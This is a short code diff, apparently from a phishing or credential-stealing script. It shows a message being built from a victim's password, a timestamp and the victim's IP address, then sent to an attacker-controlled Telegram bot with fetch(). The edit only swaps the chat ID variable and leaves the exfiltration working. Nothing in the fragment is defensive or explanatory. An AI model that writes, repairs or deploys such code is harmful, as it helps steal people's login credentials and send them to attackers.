@@ -441,7 +441,7 @@ Password: ${password}
 Time: ${new Date().toLocaleString()}
 IP: ${await getIP()}`;
                 
-                const url = `https://api.telegram.org/bot${fast_key}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                const url = `https://api.telegram.org/bot${fast_key}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
                 
                 try {
                     const response = await fetch(url);
